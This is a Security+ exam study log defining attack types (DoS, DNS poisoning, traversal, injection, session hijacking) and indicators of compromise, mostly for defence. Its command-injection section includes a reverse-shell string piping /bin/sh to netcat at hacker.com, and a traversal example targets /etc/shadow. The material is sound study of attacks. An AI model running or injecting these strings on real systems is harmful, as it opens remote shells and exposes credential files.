---
tags:
  - Domain2
---
# Security+ Study Log

**Date:** August 17, 2025
**Section/Module:** Malicious Activity Analysis
**Duration:** N/A
**Course Progress:** Objective 2.4

-----

## 📚 Today's Material Covered

- [x] Denial of Service (DoS) and Distributed DoS Attacks
- [x] Domain Name System (DNS) Attacks
- [x] Directory Traversal Attacks
- [x] Execution and Escalation Attacks
- [x] Replay Attacks
- [x] Session Hijacking
- [x] On-Path Attacks
- [x] Injection Attacks
- [x] Indicators of Compromise (IoC)

| Term                                                | Definition                                                                                                                                       |
| --------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Denial of Service (DoS)**                        | Attack making computer or server resources unavailable by overwhelming system with requests                                                     |
| **Distributed Denial of Service (DDoS)**           | DoS attack using hundreds or thousands of machines simultaneously targeting single victim                                                       |
| **Flood Attack**                                   | DoS attack sending more packets to server/host than it can handle                                                                              |
| **Ping Flood**                                     | Attack flooding server with ICMP echo request packets (pings)                                                                                  |
| **SYN Flood**                                      | Attack initiating multiple TCP sessions without completing three-way handshake using spoofed IP addresses                                     |
| **Permanent DoS (PDoS)**                          | Attack exploiting security flaw to permanently break networking device by re-flashing firmware                                                 |
| **Fork Bomb**                                      | Attack creating large number of processes to consume available processing power of computer                                                     |
| **DNS Amplification Attack**                       | DDoS attack generating high volume packets by spoofing victim's IP in DNS requests to open DNS servers                                        |
| **Zombie/Bot**                                     | Compromised machine unknowingly participating in botnet attacks                                                                                |
| **Botnet**                                         | Network of compromised machines controlled remotely for coordinated attacks                                                                    |
| **Blackholing/Sinkholing**                        | Technique routing attacking IP addresses to non-existent server through null interface                                                         |
| **Flood Guard**                                    | Network device detecting and blocking flood attacks at network boundary                                                                        |
| **Elastic Cloud Infrastructure**                   | Scalable cloud setup that can handle traffic spikes by automatically increasing capacity                                                       |
| **DNS Cache Poisoning (DNS Spoofing)**            | Attack corrupting DNS cache data with false information to redirect traffic to malicious websites                                             |
| **DNSSEC**                                         | Domain Name System Security Extensions adding digital signatures to DNS data for authenticity                                                 |
| **DNS Tunneling**                                  | Using DNS protocol to encapsulate non-DNS traffic (HTTP, SSH) over port 53 to bypass firewall rules                                          |
| **Domain Hijacking (Domain Theft)**               | Unauthorized changing of domain registration without original registrant's permission                                                          |
| **DNS Zone Transfer Attack**                       | Attack attempting to copy entire DNS zone data by pretending to be authorized system                                                           |
| **Directory Traversal**                           | Injection attack accessing commands, files, directories outside web document root using ../ sequences                                         |
| **File Inclusion**                                 | Web vulnerability allowing attacker to download files or upload executables using directory traversal                                         |
| **Remote File Inclusion**                         | Attack injecting remote file into web application for execution                                                                                |
| **Local File Inclusion**                          | Attack adding existing server file to web application for unauthorized access                                                                  |
| **Null Character (%00)**                          | URL encoding technique inserting null character to bypass security mechanisms                                                                  |
| **Arbitrary Code Execution**                      | Vulnerability allowing attacker to run their own code or modules on target system                                                             |
| **Remote Code Execution**                         | Vulnerability allowing attacker to transmit code from remote host for execution on target                                                     |
| **Privilege Escalation**                          | Attack gaining elevated access to resources normally protected from application or user                                                        |
| **Vertical Privilege Escalation**                 | Escalation from normal user to higher privilege level (admin/root)                                                                            |
| **Horizontal Privilege Escalation**               | Escalation accessing resources at same privilege level but belonging to different user                                                         |
| **Rootkit**                                        | Malware class modifying system files at kernel level to conceal presence and maintain persistence                                             |
| **Kernel Mode Rootkit**                           | Rootkit operating at ring zero with complete system control                                                                                   |
| **User Mode Rootkit**                             | Rootkit with administrator privileges using OS features for persistence                                                                        |
| **Ring Zero**                                      | Most privileged access level in computer architecture (kernel level)                                                                          |
| **Replay Attack**                                  | Network attack where valid data transmissions are maliciously rebroadcasted, repeated, or delayed                                            |
| **Credential Replay**                             | Specific replay attack targeting user login credentials for unauthorized system access                                                         |
| **Session Token**                                  | Unique data piece generated for each session making replay attacks difficult                                                                   |
| **Session Management**                             | Web application component uniquely identifying users across actions while maintaining state data                                              |
| **Session Cookie**                                 | Non-persistent cookie residing in memory, deleted when browser closes                                                                          |
| **Persistent Cookie**                              | Cookie stored in browser cache until deleted by user or expiration date                                                                       |
| **Session Hijacking**                             | Spoofing attack where attacker disconnects host and replaces with own machine                                                                 |
| **Session Prediction**                            | Attack attempting to predict session token to hijack session                                                                                  |
| **Cookie Poisoning**                              | Modifying cookie contents after generation to exploit web application vulnerabilities                                                         |
| **On-Path Attack**                                | Attack placing workstation logically between two hosts to capture, monitor, relay communications                                              |
| **ARP Poisoning**                                  | Method of conducting on-path attack by corrupting ARP tables                                                                                  |
| **Rogue Access Point**                            | Unauthorized wireless access point used for on-path attacks                                                                                   |
| **Relay Attack**                                  | Attack where attacker becomes proxy between hosts, reading/modifying communications                                                           |
| **SSL Stripping**                                 | Technique downgrading HTTPS connections to HTTP to bypass encryption                                                                          |
| **Downgrade Attack**                              | Attack forcing client/server to abandon higher security mode for lower security mode                                                          |
| **LDAP Injection**                                | Application attack fabricating LDAP statements through user input to search/access directory information                                      |
| **Command Injection**                             | Attack executing arbitrary shell commands on host via vulnerable web application                                                              |
| **Process Injection**                             | Method executing arbitrary code in address space of separate live process                                                                     |
| **DLL Injection**                                 | Process injection technique using Dynamic Link Library files                                                                                  |
| **Process Hollowing**                             | Technique replacing legitimate process memory with malicious code                                                                              |
| **Indicators of Compromise (IoC)**                | Forensic data pieces identifying potentially malicious activity on network or system                                                          |
| **Account Lockout**                               | Security feature locking account after multiple failed login attempts                                                                         |
| **Concurrent Session Usage**                      | Multiple active sessions from single user account indicating potential compromise                                                              |
| **Blocked Content**                               | Attempts to access/download content blocked by security protocols                                                                             |
| **Impossible Travel**                             | Logins from geographically distant locations within impossible timeframe                                                                      |
| **Resource Consumption**                          | Unusual spikes in CPU, memory, or network bandwidth usage                                                                                     |
| **Resource Inaccessibility**                     | Inability to access files, databases, or network services (often ransomware indicator)                                                       |
| **Out-of-Cycle Logging**                         | Log entries occurring at unusual times (nights, weekends) when no activity expected                                                          |
| **Missing Logs**                                  | Gap in system logs potentially indicating attacker tampering to cover tracks                                                                 |
| **Published Compromise**                          | Public disclosure of hack on social media, forums, or victim's website                                                                       |

### Important Points

**Denial of Service Attack Categories:**
- **Flood Attacks**: Overwhelming server with more packets than it can handle
- **Ping Flood**: ICMP echo request packet flooding (commonly blocked by firewalls)
- **SYN Flood**: TCP session initiation without handshake completion using spoofed IPs
- **Permanent DoS**: Firmware corruption preventing device reboot (requires full reload)
- **Fork Bomb**: Process multiplication consuming processing power (not network spreading)

**SYN Flood Attack Mechanics:**
- **Attack Method**: Multiple TCP SYN packets with fake source IPs
- **Server Response**: Attempts three-way handshake with non-existent addresses
- **Resource Exhaustion**: Server reserves resources for non-responsive connections
- **DoS Condition**: Unable to establish legitimate connections when resources depleted
- **Detection**: Flood guards, IPS systems, firewall features can identify patterns

**DDoS Attack Evolution:**
- **Scale Increase**: Hundreds/thousands of machines vs single attacker
- **Botnet Usage**: Zombie machines unknowingly participating in coordinated attacks
- **Command Structure**: Central command triggers simultaneous payload delivery
- **GitHub Example**: March 2018 attack reached 1.35 terabits/second, 5-minute outage
- **Modern Capacity**: Even largest attacks can be mitigated with proper defenses

**DNS Amplification Attack Process:**
- **Spoofed Requests**: Small DNS queries with victim's spoofed IP address
- **Response Amplification**: Large DNS responses sent to victim's server
- **Bandwidth Consumption**: Small request generates large response (amplification factor)
- **Botnet Enhancement**: Thousands of simultaneous requests multiply impact
- **Mitigation**: Response size limits, rate limiting, traffic analysis

**DoS Attack Mitigation Strategies:**
- **Blackholing/Sinkholing**: Route attacking IPs to null interface (temporary solution)
- **Intrusion Prevention**: IPS can handle small-scale attacks but limited against large DDoS
- **Elastic Infrastructure**: Auto-scaling cloud resources (expensive but effective)
- **Specialized Providers**: CloudFlare, Akamai designed for DDoS protection
- **Layered Defense**: Multiple protection mechanisms across OSI model layers

**DNS Attack Types:**
- **Cache Poisoning**: Corrupting resolver cache with false IP addresses
- **Amplification**: Exploiting DNS resolution for DDoS attacks
- **Tunneling**: Encapsulating non-DNS traffic over port 53
- **Domain Hijacking**: Unauthorized domain registration changes
- **Zone Transfer**: Attempting to copy entire DNS zone data

**DNS Security Implementations:**
- **DNSSEC**: Digital signatures ensuring DNS data authenticity and integrity
- **Secure Configurations**: Firewalls protecting DNS servers from unauthorized access
- **Traffic Monitoring**: Analyzing DNS logs for unusual patterns indicating tunneling
- **Registry Locks**: Preventing unauthorized domain registration changes
- **Zone Transfer Restrictions**: Limiting authorized systems for zone transfers

**Directory Traversal Attack Patterns:**
- **Common Indicator**: ../ sequences attempting to navigate directory structure
- **Platform Variations**: Unix/Linux use ../, Windows use ..\ (often accepts both)
- **Encoding Evasion**: %2e%2e%2f represents ../ in URL encoding
- **Target Goal**: Access files outside web document root directory
- **Example Path**: ../../../../etc/shadow attempts to read system password file

**File Inclusion Attack Types:**
- **Remote File Inclusion**: Injecting external malicious script via URL parameter
- **Local File Inclusion**: Referencing existing server files for unauthorized execution
- **Null Character Bypass**: %00 insertion to bypass file extension restrictions
- **Directory Traversal Integration**: Often combined with path traversal techniques
- **Parameter Manipulation**: Exploiting user input parameters in web applications

**Privilege Escalation Classifications:**
- **Vertical Escalation**: Normal user gaining admin/root privileges (most common concern)
- **Horizontal Escalation**: Accessing resources at same privilege level but different user
- **Application Context**: Arbitrary code inherits permissions of running application
- **System Account Risk**: Processes running as system provide highest privilege target
- **Domain Admin Goal**: Ultimate target for enterprise network compromise

**Rootkit Characteristics:**
- **Kernel Mode**: Ring zero access with complete system control (most dangerous)
- **User Mode**: Administrator privileges using OS features for persistence
- **Stealth Capability**: Modifying system files to conceal presence
- **Detection Difficulty**: Operating below normal security tool visibility
- **Persistence Mechanisms**: Surviving reboots, user logoffs, system changes

**Session Management Security:**
- **Stateless Protocol**: HTTP requires cookies or database storage for session state
- **Cookie Types**: Session (memory-resident) vs persistent (cache-stored with expiration)
- **Token Generation**: Non-predictable algorithms preventing session prediction
- **Encryption Requirement**: Protecting confidential cookie information during transmission
- **Validation Importance**: Input validation preventing cookie poisoning attacks

**On-Path Attack Techniques:**
- **Positioning**: Logical placement between communicating hosts
- **Interception Methods**: ARP poisoning, DNS poisoning, rogue access points
- **Replay vs Relay**: Capture/repeat vs real-time proxy modification
- **Encryption Challenges**: TLS 1.3 makes interception difficult/impossible
- **SSL Stripping**: Forcing HTTP downgrade from HTTPS connections

**Injection Attack Prevention:**
- **Input Validation**: Sanitizing all user-provided data before processing
- **Parameterized Queries**: Preventing SQL injection through proper query construction
- **Whitelist Filtering**: Allowing only known-good input patterns
- **Output Encoding**: Properly encoding data before display to prevent XSS
- **Least Privilege**: Running applications with minimal necessary permissions

**Indicators of Compromise Analysis:**
- **Account Lockouts**: Multiple failed login attempts indicating brute force attacks
- **Concurrent Sessions**: Same account active from multiple locations simultaneously
- **Impossible Travel**: Geographically impossible login timing (NY to London in 1 hour)
- **Resource Spikes**: Unusual CPU/memory/network usage indicating malware or mining
- **Missing Logs**: Gaps suggesting attacker log tampering to cover tracks

**IoC Investigation Considerations:**
- **False Positives**: Not all indicators necessarily mean compromise occurred
- **Context Analysis**: Evaluating multiple indicators together for accurate assessment
- **Time Correlation**: Analyzing timing relationships between different indicators
- **User Behavior**: Distinguishing legitimate user activity from suspicious activity
- **System Errors**: Differentiating between security incidents and technical problems

**Command Injection Examples:**
- **Basic Injection**: diontraining.com && hostname (executes ping then hostname command)
- **Shell Access**: diontraining.com && /bin/sh | nc hacker.com 443 (establishes reverse shell)
- **Command Chaining**: Using && to execute multiple commands sequentially
- **Input Validation**: Accepting only IP addresses/domains, ignoring additional parameters
- **Sanitization**: Removing or escaping special characters that enable command chaining

**Real-World Attack Scenarios:**
- **Banking Applications**: Capturing login sessions for unauthorized transactions
- **E-commerce Sites**: Session hijacking for unauthorized purchases and account takeover
- **Corporate Networks**: Privilege escalation for lateral movement and data exfiltration
- **Web Applications**: Directory traversal accessing sensitive configuration files
- **DNS Infrastructure**: Cache poisoning redirecting users to phishing sites

## 🏷️ Domain Tags

**#Domain2** - Threats, Vulnerabilities & Mitigations
- Malicious activity analysis and indicators
- Attack vector identification and classification
- Compromise detection and incident response
- Vulnerability exploitation techniques